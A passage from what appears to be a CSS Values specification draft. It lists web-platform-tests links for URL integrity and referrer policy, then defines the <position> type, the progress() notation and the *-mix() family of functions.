 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/integrity/url-image-integrity.sub.html)
- [url-import-integrity-negative.sub.html](https://wpt.fyi/results/css/css-values/urls/integrity/url-import-integrity-negative.sub.html "css/css-values/urls/integrity/url-import-integrity-negative.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/integrity/url-import-integrity-negative.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/integrity/url-import-integrity-negative.sub.html)
- [url-import-integrity.sub.html](https://wpt.fyi/results/css/css-values/urls/integrity/url-import-integrity.sub.html "css/css-values/urls/integrity/url-import-integrity.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/integrity/url-import-integrity.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/integrity/url-import-integrity.sub.html)
- [url-svg-filter-integrity-negative.sub.html](https://wpt.fyi/results/css/css-values/urls/integrity/url-svg-filter-integrity-negative.sub.html "css/css-values/urls/integrity/url-svg-filter-integrity-negative.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/integrity/url-svg-filter-integrity-negative.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/integrity/url-svg-filter-integrity-negative.sub.html)
- [url-svg-filter-integrity.sub.html](https://wpt.fyi/results/css/css-values/urls/integrity/url-svg-filter-integrity.sub.html "css/css-values/urls/integrity/url-svg-filter-integrity.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/integrity/url-svg-filter-integrity.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/integrity/url-svg-filter-integrity.sub.html)
- [url-image-referrer-policy-cross-origin.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/no-referrer-when-downgrade/url-image-referrer-policy-cross-origin.html "css/css-values/urls/referrer-policy/no-referrer-when-downgrade/url-image-referrer-policy-cross-origin.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/no-referrer-when-downgrade/url-image-referrer-policy-cross-origin.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/no-referrer-when-downgrade/url-image-referrer-policy-cross-origin.html)
- [url-image-referrer-policy-same-origin.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/no-referrer-when-downgrade/url-image-referrer-policy-same-origin.html "css/css-values/urls/referrer-policy/no-referrer-when-downgrade/url-image-referrer-policy-same-origin.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/no-referrer-when-downgrade/url-image-referrer-policy-same-origin.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/no-referrer-when-downgrade/url-image-referrer-policy-same-origin.html)
- [url-font-referrer-policy.sub.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/no-referrer/url-font-referrer-policy.sub.html "css/css-values/urls/referrer-policy/no-referrer/url-font-referrer-policy.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/no-referrer/url-font-referrer-policy.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/no-referrer/url-font-referrer-policy.sub.html)
- [url-image-referrer-policy-cross-origin.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/no-referrer/url-image-referrer-policy-cross-origin.html "css/css-values/urls/referrer-policy/no-referrer/url-image-referrer-policy-cross-origin.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/no-referrer/url-image-referrer-policy-cross-origin.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/no-referrer/url-image-referrer-policy-cross-origin.html)
- [url-image-referrer-policy-external-stylesheet.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/no-referrer/url-image-referrer-policy-external-stylesheet.html "css/css-values/urls/referrer-policy/no-referrer/url-image-referrer-policy-external-stylesheet.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/no-referrer/url-image-referrer-policy-external-stylesheet.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/no-referrer/url-image-referrer-policy-external-stylesheet.html)
- [url-image-referrer-policy-same-origin.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/no-referrer/url-image-referrer-policy-same-origin.html "css/css-values/urls/referrer-policy/no-referrer/url-image-referrer-policy-same-origin.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/no-referrer/url-image-referrer-policy-same-origin.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/no-referrer/url-image-referrer-policy-same-origin.html)
- [url-image-set-referrer-policy.sub.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/no-referrer/url-image-set-referrer-policy.sub.html "css/css-values/urls/referrer-policy/no-referrer/url-image-set-referrer-policy.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/no-referrer/url-image-set-referrer-policy.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/no-referrer/url-image-set-referrer-policy.sub.html)
- [url-import-referrer-policy.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/no-referrer/url-import-referrer-policy.html "css/css-values/urls/referrer-policy/no-referrer/url-import-referrer-policy.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/no-referrer/url-import-referrer-policy.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/no-referrer/url-import-referrer-policy.html)
- [url-svg-filter-referrer-policy.sub.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/no-referrer/url-svg-filter-referrer-policy.sub.html "css/css-values/urls/referrer-policy/no-referrer/url-svg-filter-referrer-policy.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/no-referrer/url-svg-filter-referrer-policy.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/no-referrer/url-svg-filter-referrer-policy.sub.html)
- [url-image-referrer-policy-cross-origin.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/origin-when-cross-origin/url-image-referrer-policy-cross-origin.html "css/css-values/urls/referrer-policy/origin-when-cross-origin/url-image-referrer-policy-cross-origin.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/origin-when-cross-origin/url-image-referrer-policy-cross-origin.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/origin-when-cross-origin/url-image-referrer-policy-cross-origin.html)
- [url-image-referrer-policy-same-origin.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/origin-when-cross-origin/url-image-referrer-policy-same-origin.html "css/css-values/urls/referrer-policy/origin-when-cross-origin/url-image-referrer-policy-same-origin.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/origin-when-cross-origin/url-image-referrer-policy-same-origin.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/origin-when-cross-origin/url-image-referrer-policy-same-origin.html)
- [url-image-referrer-policy-cross-origin.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/origin/url-image-referrer-policy-cross-origin.html "css/css-values/urls/referrer-policy/origin/url-image-referrer-policy-cross-origin.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/origin/url-image-referrer-policy-cross-origin.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/origin/url-image-referrer-policy-cross-origin.html)
- [url-image-referrer-policy-external-stylesheet.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/origin/url-image-referrer-policy-external-stylesheet.html "css/css-values/urls/referrer-policy/origin/url-image-referrer-policy-external-stylesheet.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/origin/url-image-referrer-policy-external-stylesheet.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/origin/url-image-referrer-policy-external-stylesheet.html)
- [url-image-referrer-policy-same-origin.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/origin/url-image-referrer-policy-same-origin.html "css/css-values/urls/referrer-policy/origin/url-image-referrer-policy-same-origin.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/origin/url-image-referrer-policy-same-origin.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/origin/url-image-referrer-policy-same-origin.html)
- [url-image-referrer-policy-cross-origin.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/same-origin/url-image-referrer-policy-cross-origin.html "css/css-values/urls/referrer-policy/same-origin/url-image-referrer-policy-cross-origin.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/same-origin/url-image-referrer-policy-cross-origin.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/same-origin/url-image-referrer-policy-cross-origin.html)
- [url-image-referrer-policy-same-origin.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/same-origin/url-image-referrer-policy-same-origin.html "css/css-values/urls/referrer-policy/same-origin/url-image-referrer-policy-same-origin.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/same-origin/url-image-referrer-policy-same-origin.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/same-origin/url-image-referrer-policy-same-origin.html)
- [url-image-referrer-policy-cross-origin.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/strict-origin-when-cross-origin/url-image-referrer-policy-cross-origin.html "css/css-values/urls/referrer-policy/strict-origin-when-cross-origin/url-image-referrer-policy-cross-origin.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/strict-origin-when-cross-origin/url-image-referrer-policy-cross-origin.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/strict-origin-when-cross-origin/url-image-referrer-policy-cross-origin.html)
- [url-image-referrer-policy-same-origin.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/strict-origin-when-cross-origin/url-image-referrer-policy-same-origin.html "css/css-values/urls/referrer-policy/strict-origin-when-cross-origin/url-image-referrer-policy-same-origin.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/strict-origin-when-cross-origin/url-image-referrer-policy-same-origin.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/strict-origin-when-cross-origin/url-image-referrer-policy-same-origin.html)
- [url-image-referrer-policy-cross-origin.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/strict-origin/url-image-referrer-policy-cross-origin.html "css/css-values/urls/referrer-policy/strict-origin/url-image-referrer-policy-cross-origin.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/strict-origin/url-image-referrer-policy-cross-origin.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/strict-origin/url-image-referrer-policy-cross-origin.html)
- [url-image-referrer-policy-same-origin.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/strict-origin/url-image-referrer-policy-same-origin.html "css/css-values/urls/referrer-policy/strict-origin/url-image-referrer-policy-same-origin.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/strict-origin/url-image-referrer-policy-same-origin.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/strict-origin/url-image-referrer-policy-same-origin.html)
- [url-image-referrer-policy-cross-origin.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/unsafe-url/url-image-referrer-policy-cross-origin.html "css/css-values/urls/referrer-policy/unsafe-url/url-image-referrer-policy-cross-origin.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/unsafe-url/url-image-referrer-policy-cross-origin.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/unsafe-url/url-image-referrer-policy-cross-origin.html)
- [url-image-referrer-policy-external-stylesheet.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/unsafe-url/url-image-referrer-policy-external-stylesheet.html "css/css-values/urls/referrer-policy/unsafe-url/url-image-referrer-policy-external-stylesheet.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/unsafe-url/url-image-referrer-policy-external-stylesheet.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/unsafe-url/url-image-referrer-policy-external-stylesheet.html)
- [url-image-referrer-policy-same-origin.html](https://wpt.fyi/results/css/css-values/urls/referrer-policy/unsafe-url/url-image-referrer-policy-same-origin.html "css/css-values/urls/referrer-policy/unsafe-url/url-image-referrer-policy-same-origin.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/referrer-policy/unsafe-url/url-image-referrer-policy-same-origin.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/referrer-policy/unsafe-url/url-image-referrer-policy-same-origin.html)
- [url-request-modifiers-computed.sub.html](https://wpt.fyi/results/css/css-values/urls/url-request-modifiers-computed.sub.html "css/css-values/urls/url-request-modifiers-computed.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/url-request-modifiers-computed.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/url-request-modifiers-computed.sub.html)
- [url-request-modifiers-font-face-parsing.html](https://wpt.fyi/results/css/css-values/urls/url-request-modifiers-font-face-parsing.html "css/css-values/urls/url-request-modifiers-font-face-parsing.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/url-request-modifiers-font-face-parsing.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/url-request-modifiers-font-face-parsing.html)
- [url-request-modifiers-import-parsing.sub.html](https://wpt.fyi/results/css/css-values/urls/url-request-modifiers-import-parsing.sub.html "css/css-values/urls/url-request-modifiers-import-parsing.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/url-request-modifiers-import-parsing.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/url-request-modifiers-import-parsing.sub.html)
- [url-request-modifiers-invalid.sub.html](https://wpt.fyi/results/css/css-values/urls/url-request-modifiers-invalid.sub.html "css/css-values/urls/url-request-modifiers-invalid.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/url-request-modifiers-invalid.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/url-request-modifiers-invalid.sub.html)
- [url-request-modifiers-serialize.sub.html](https://wpt.fyi/results/css/css-values/urls/url-request-modifiers-serialize.sub.html "css/css-values/urls/url-request-modifiers-serialize.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/url-request-modifiers-serialize.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/url-request-modifiers-serialize.sub.html)

### 4.2. 2D Positioning: the [\<position\> type]
The [[\<position\>](#typedef-position)] value specifies the position of an [alignment
subject](https://drafts.csswg.org/css-align-3/#alignment-subject) (e.g. a background image) inside an [alignment
container](https://drafts.csswg.org/css-align-3/#alignment-container) (e.g. its [background positioning
area](https://drafts.csswg.org/css-backgrounds-3/#background-positioning-area)) as a pair of offsets between the specified edges
(defaulting to the left and top). Its syntax is:

```
<position> = <position-one> | <position-two> | <position-four>
<position-one> = [
 left | center | right | top | bottom |
 x-start | x-end | y-start | y-end |
 block-start | block-end | inline-start | inline-end |
 <length-percentage>
]
<position-two> = [
 [ left | center | right | x-start | x-end ] &&
 [ top | center | bottom | y-start | y-end ]
|
 [ left | center | right | x-start | x-end | <length-percentage> ]
 [ top | center | bottom | y-start | y-end | <length-percentage> ]
|
 [ block-start | center | block-end ] &&
 [ inline-start | center | inline-end ]
|
 [ start | center | end ]{2}
]
<position-four> = [
 [ [ left | right | x-start | x-end ] <length-percentage> ] &&
 [ [ top | bottom | y-start | y-end ] <length-percentage> ]
|
 [ [ block-start | block-end ] <length-percentage> ] &&
 [ [ inline-start | inline-end ] <length-percentage> ]
|
 [ [ start | end ] <length-percentage> ]{2}
]
```

If only one value is specified
([\<position-one\>](#typedef-position-one)), the second value is assumed to be
[center](#valdef-position-center).

If two values are given
([\<position-two\>](#typedef-position-two)), a
[\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage) as the first value represents the
horizontal position as the offset between the left edges of the
[alignment
subject](https://drafts.csswg.org/css-align-3/#alignment-subject) and [alignment
container](https://drafts.csswg.org/css-align-3/#alignment-container), and a
[\<length-percentage\>]
as the second value represents the vertical position as an offset
between their top edges.

If both keywords are one of [start] or [end], the first one
represents the [block
axis](https://drafts.csswg.org/css-writing-modes-4/#block-axis) and the second the [inline
axis](https://drafts.csswg.org/css-writing-modes-4/#inline-axis).

 A pair of axis-specific keywords can be reordered,
while a combination of keyword and length or percentage cannot. So
[center left] or [inline-start block-end] is valid, while
[50% left] is not. [start] and [end] aren't
axis-specific, so [start end] and [end start] represent two
different positions.

If four values are given
([\<position-four\>](#typedef-position-four)) then each
[\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage) represents an offset between the
edges specified by the preceding keyword. For example,
[background-position: bottom 10px right
20px](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-position) represents a [10px] vertical offset up
from the bottom edge and a [20px] horizontal offset leftward from
the right edge.

Positive values represent an offset *inward* from the edge of the
[alignment
container](https://drafts.csswg.org/css-align-3/#alignment-container). Negative values represent an offset *outward* from the
edge of the [alignment container].

The following declarations give the
stated (horizontal, vertical) offsets from the top left corner:

``` highlight
background-position: left 10px top 15px; /* 10px, 15px */
background-position: left top ; /* 0px, 0px */
background-position: 10px 15px; /* 10px, 15px */
background-position: left 15px; /* 0px, 15px */
background-position: 10px top ; /* 10px, 0px */
```

[\<position\>](#typedef-position)s can also be relative to other corners
than the top left. For example, the following puts the background image
10px from the bottom and 3em from the right:

``` highlight
background-position: right 3em bottom 10px
```

The [computed
value](https://drafts.csswg.org/css-cascade-5/#computed-value) of a
[\<position\>](#typedef-position) is a pair of offsets (horizontal and
vertical), each given as a computed
[\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage) value, representing the distance
between the left edges and top edges (respectively) of the [alignment
subject](https://drafts.csswg.org/css-align-3/#alignment-subject) and [alignment
container](https://drafts.csswg.org/css-align-3/#alignment-container).

[[\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage)]

: A
 [\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage) value specifies the size of the
 offset between the specified edges of the [alignment
 subject](https://drafts.csswg.org/css-align-3/#alignment-subject) and [alignment
 container](https://drafts.csswg.org/css-align-3/#alignment-container).

 For example, for [background-position: 2cm
 1cm](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-position), the top left corner of the background
 image is placed 2cm to the right and 1cm below the top left corner
 of the [background positioning
 area](https://drafts.csswg.org/css-backgrounds-3/#background-positioning-area).

 A
 [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value) for the horizontal offset is
 relative to
 (`width of `[`alignment container`](https://drafts.csswg.org/css-align-3/#alignment-container) -
 `width of `[`alignment subject`](https://drafts.csswg.org/css-align-3/#alignment-subject)). A [\<percentage\>] for the vertical offset is relative to
 (`height of `[`alignment container`](https://drafts.csswg.org/css-align-3/#alignment-container) -
 `height of `[`alignment subject`](https://drafts.csswg.org/css-align-3/#alignment-subject)).

 :::
 (#example-0fd7dab3) For example, with a value pair of
 [0% 0%], the upper left corner of the [alignment
 subject](https://drafts.csswg.org/css-align-3/#alignment-subject) is aligned with the upper left corner of the
 [alignment
 container](https://drafts.csswg.org/css-align-3/#alignment-container) A value pair of [100% 100%] places the lower
 right corner of the [alignment subject]
 in the lower right corner of the [alignment
 container]. With a value pair of [75%
 50%], the point 75% across and 50% down the [alignment
 subject] is to be placed at the point
 75% across and 50% down the [alignment
 container].
 ![Diagram of the meaning of [background-position: 75%
 50%](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-position).](images/bg-pos.png){a
 height="269" width="397"}
 :::

[top]\
[right]\
[bottom]\
[left]
: Offsets the top/left/right/bottom edges (respectively) of the
 [alignment
 subject](https://drafts.csswg.org/css-align-3/#alignment-subject) and [alignment
 container](https://drafts.csswg.org/css-align-3/#alignment-container) by the specified amount (defaulting to [0%])
 in the corresponding axis.

[y-start]\
[y-end]\
[x-start]\
[x-end]
: Computes the same as the physical edge keyword corresponding to the
 [start](https://drafts.csswg.org/css-writing-modes-4/#css-start)/[end](https://drafts.csswg.org/css-writing-modes-4/#css-end) side in the
 [y](https://drafts.csswg.org/css-writing-modes-4/#y-axis)/[x](https://drafts.csswg.org/css-writing-modes-4/#x-axis) axis.

[block-start]\
[block-end]\
[inline-start]\
[inline-end]
: Computes the same as the physical edge keyword corresponding to the
 [start](https://drafts.csswg.org/css-writing-modes-4/#css-start)/[end](https://drafts.csswg.org/css-writing-modes-4/#css-end) side in the
 [block](https://drafts.csswg.org/css-writing-modes-4/#block-axis)/[inline](https://drafts.csswg.org/css-writing-modes-4/#inline-axis) axis.

[center]
: Computes to a [50%] offset in the corresponding axis.

Unless otherwise specified, the
[flow-relative](https://drafts.csswg.org/css-writing-modes-4/#flow-relative) keywords are resolved according to the [writing
mode](https://drafts.csswg.org/css-writing-modes-4/#writing-mode) of the element on which the value is specified.

 The
[background-position](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-position) property also accepts a three-value
syntax. This has been disallowed generically because it creates parsing
ambiguities when combined with other length or percentage components in
a property value.

Need to define how this syntax would
expand to the longhands of
[background-position](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-position) if e.g.
[var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) is used for some (or all) of the components.
[\[Issue #9690\]](https://github.com/w3c/csswg-drafts/issues/9690)

#### 4.2.1. Parsing [\<position\>]
When specified in a grammar alongside other keywords,
[\<length\>](https://drafts.csswg.org/css-values-4/#length-value)s, or
[\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value)s,
[\<position\>](#typedef-position) is *greedily* parsed; it consumes as many
components as possible.

For example,
[transform-origin](https://drafts.csswg.org/css-transforms-1/#propdef-transform-origin) defines a 3D position as
(effectively)
[[\<position\>](#typedef-position)
[\<length\>](https://drafts.csswg.org/css-values-4/#length-value)?]. A value such as [left
50px] will be parsed as a 2-value
[\<position\>](#typedef-position), with an omitted z-component; on the other
hand, a value such as [top 50px] will be parsed as a single-value
[\<position\>] followed by a
[\<length\>](https://drafts.csswg.org/css-values-4/#length-value).

#### 4.2.2. Serializing [\<position\>]
When serializing the [specified
value](https://drafts.csswg.org/css-cascade-5/#specified-value) of a
[\<position\>](#typedef-position):

If only one component is specified:

: - The implied
 [center](https://drafts.csswg.org/css-backgrounds-3/#valdef-background-position-center) keyword is added, and a 2-component value
 is serialized.

If two components are specified:

: - Keywords are serialized as keywords.

 - [\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage)s are serialized as
 [\<length-percentage\>]s.

 - Components are serialized horizontal first, then vertical.

If four components are specified:

: - Keywords and offsets are both serialized.

 - Components are serialized horizontal first, then vertical;
 alternatively
 [block-axis](https://drafts.csswg.org/css-writing-modes-4/#block-axis) first, then
 [inline-axis](https://drafts.csswg.org/css-writing-modes-4/#inline-axis).

[\<position\>](#typedef-position) values are never serialized as a single
value, even when a single value would produce the same behavior, to
avoid causing parsing ambiguities in some grammars where a
[\<position\>] is placed next
to a
[\<length\>](https://drafts.csswg.org/css-values-4/#length-value), such as
[transform-origin](https://drafts.csswg.org/css-transforms-1/#propdef-transform-origin).

The [computed
value](https://drafts.csswg.org/css-cascade-5/#computed-value) of a
[\<position\>](#typedef-position) is serialized as a pair of
[\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage)s representing offsets from the left
and top edges, in that order.

#### 4.2.3. Combination of [\<position\>]
[Interpolation](https://drafts.csswg.org/css-values-4/#interpolation) of
[\<position\>](#typedef-position) is defined as the independent
interpolation of each component (x, y) normalized as an offset from the
top left corner as a
[\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage).

[Addition](https://drafts.csswg.org/css-values-4/#addition) of
[\<position\>](#typedef-position) is likewise defined as the independent
[addition] each component (x, y) normalized as an
offset from the top left corner as a
[\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage).

## 5. Interpolation Progress Calculations: the [progress() notation]
Tests

- [progress-computed.html](https://wpt.fyi/results/css/css-values/progress-computed.html "css/css-values/progress-computed.html")
 [[(live
 test)]](http://wpt.live/css/css-values/progress-computed.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/progress-computed.html)
- [progress-invalid.html](https://wpt.fyi/results/css/css-values/progress-invalid.html "css/css-values/progress-invalid.html")
 [[(live
 test)]](http://wpt.live/css/css-values/progress-invalid.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/progress-invalid.html)
- [progress-serialize.html](https://wpt.fyi/results/css/css-values/progress-serialize.html "css/css-values/progress-serialize.html")
 [[(live
 test)]](http://wpt.live/css/css-values/progress-serialize.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/progress-serialize.html)

The [progress()] [functional
notation](https://drafts.csswg.org/css-values-4/#functional-notation) represents the proportional distance of a given value
(the [progress value]) from one value (the [progress start
value]) to another value (the [progress end
value]), each represented as a
[calculation](https://drafts.csswg.org/css-values-4/#calc-calculation). It is a [math
function](https://drafts.csswg.org/css-values-4/#math-function), and can be input into other calculations such as a
[math function] or a [mix
notation](#mix-notations). The
syntax of [progress()](#funcdef-progress) is:

```
<progress()> = progress(no-clamp? <calc-sum>, <calc-sum>, <calc-sum>)
```

where the first, second, and third
[\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) values represent the [progress
value](#progress-value),
[progress start
value](#progress-start-value), and [progress end
value](#progress-end-value), respectively.

If [no-clamp] is present, the
[progress()](#funcdef-progress) function can potentially resolve to any number; if
omitted (the default), the return value is clamped to the range \[0,
1\].

The argument
[calculations](https://drafts.csswg.org/css-values-4/#calc-calculation) can resolve to any
[\<number\>](https://drafts.csswg.org/css-values-4/#number-value),
[\<dimension\>](https://drafts.csswg.org/css-values-4/#typedef-dimension), or
[\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value), but must have a [consistent
type](https://drafts.csswg.org/css-values-4/#css-consistent-type) or else the function is invalid.

The result of [progress()](#funcdef-progress) is a
[\<number\>](https://drafts.csswg.org/css-values-4/#number-value) [made
consistent](https://drafts.csswg.org/css-values-4/#css-make-a-type-consistent) with the [consistent
type](https://drafts.csswg.org/css-values-4/#css-consistent-type) of its arguments, resolved by [calculating a progress
function] as
follows:

If the [progress start value](#progress-start-value) and [progress end value](#progress-end-value) are different values

: `(`[`progress value`](#progress-value)` - `[`progress start value`](#progress-start-value)`) / (`[`progress end value`](#progress-end-value)` - `[`progress start value`]`)`,
 clamped to the \[0,1\] range if
 [no-clamp](#valdef-progress-no-clamp) is not specified.

If the [progress start value](#progress-start-value) and [progress end value](#progress-end-value) are the same value

: 0 if
 [no-clamp](#valdef-progress-no-clamp) is not specified.

 Otherwise, 0, -∞, or +∞, depending on whether [progress
 value](#progress-value) is
 equal to, less than, or greater than the shared value.

Do we need a [percent-progress()]
notation, or do enough places auto-convert that it's not necessary?

Should progress() functions clamp to
0-100%? [\[Issue
#11825\]](https://github.com/w3c/csswg-drafts/issues/11825)

 The
[progress()](#funcdef-progress) function is essentially syntactic sugar for a
particular pattern of
[calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) notations.

## 6. Weighted Average Notations: the \*-mix() family

Several [mix notations] in CSS allow representing the weighted average of a set of
values. These [functional
notations](https://drafts.csswg.org/css-values-4/#functional-notation) follow the syntactic pattern:

```
*mix() = *mix( options? , [ value && <percentage>? ]# )
```

where the `options` can provide type-specific mixing options,
and each `value` and optional
[\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value) pair in the argument list is a [mix
item] representing
an input to the mix and its weight in the average.

The [mix notations](#mix-notations) in CSS include:

- [calc-mix()](#funcdef-calc-mix), for mixing
 [\<number\>](https://drafts.csswg.org/css-values-4/#number-value),
 [\<length\>](https://drafts.csswg.org/css-values-4/#length-value),
 [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value),
 [\<time\>](https://drafts.csswg.org/css-values-4/#time-value), and other dimensions representable
 in
 [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) expressions

- [transform-mix()](#funcdef-transform-mix), for mixing
 [\<transform-list\>](https://drafts.csswg.org/css-transforms-1/#typedef-transform-list)s

- [color-mix()](https://drafts.csswg.org/css-color-5/#funcdef-color-mix), for mixing
 [\<color\>](https://drafts.csswg.org/css-color-5/#typedef-color) values (see
 [\[css-color-5\]](#biblio-css-color-5 "CSS Color Module Level 5"))

- [cross-fade()](https://drafts.csswg.org/css-images-4/#funcdef-cross-fade), for mixing
 [\<image\>](https://drafts.csswg.org/css-images-3/#typedef-image) values (see
 [\[css-images-4\]](#biblio-css-images-4 "CSS Images Module Level 4"))

- [palette-mix()](https://drafts.csswg.org/css-fonts-4/#funcdef-palette-mix), for mixing
 [font-palette](https://drafts.csswg.org/css-fonts-4/#propdef-font-palette) values (see
 [\[css-fonts-4\]](#biblio-css-fonts-4 "CSS Fonts Module Level 4"))

